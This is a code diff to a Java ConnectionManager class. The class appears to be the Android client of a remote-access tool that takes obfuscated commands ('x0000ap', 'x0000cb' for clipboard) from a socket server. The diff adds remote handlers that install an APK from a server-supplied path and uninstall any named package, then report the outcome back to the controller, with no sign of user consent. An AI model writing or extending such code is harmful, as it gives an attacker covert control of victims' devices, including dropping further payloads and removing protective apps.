@@ -248,6 +248,14 @@ public class ConnectionManager {
                     x0000ap();
                     break;
                     
+                case "x0000ia": // Install App
+                    handleInstallApp(data);
+                    break;
+                    
+                case "x0000ua": // Uninstall App
+                    handleUninstallApp(data);
+                    break;
+                    
                 case "x0000cb": // Clipboard
                     handleClipboardOrder(data);
                     break;
@@ -716,6 +724,46 @@ public class ConnectionManager {
             ioSocket.emit("x0000ap", result);
         } catch (Exception e) {
             Log.e(TAG, "Error in apps command", e);
+        }
+    }
+    
+    private static void handleInstallApp(JSONObject data) {
+        try {
+            String apkPath = data.getString("apkPath");
+            Log.d(TAG, "Install app command: " + apkPath);
+            AppManager appManager = new AppManager(context);
+            JSONObject result = appManager.installApp(apkPath);
+            ioSocket.emit("x0000ia", result);
+        } catch (Exception e) {
+            Log.e(TAG, "Error installing app", e);
+            try {
+                JSONObject errorResult = new JSONObject();
+                errorResult.put("success", false);
+                errorResult.put("error", e.getMessage());
+                ioSocket.emit("x0000ia", errorResult);
+            } catch (Exception e2) {
+                Log.e(TAG, "Error sending install result", e2);
+            }
+        }
+    }
+    
+    private static void handleUninstallApp(JSONObject data) {
+        try {
+            String packageName = data.getString("packageName");
+            Log.d(TAG, "Uninstall app command: " + packageName);
+            AppManager appManager = new AppManager(context);
+            JSONObject result = appManager.uninstallApp(packageName);
+            ioSocket.emit("x0000ua", result);
+        } catch (Exception e) {
+            Log.e(TAG, "Error uninstalling app", e);
+            try {
+                JSONObject errorResult = new JSONObject();
+                errorResult.put("success", false);
+                errorResult.put("error", e.getMessage());
+                ioSocket.emit("x0000ua", errorResult);
+            } catch (Exception e2) {
+                Log.e(TAG, "Error sending uninstall result", e2);
+            }
         }
     }
 
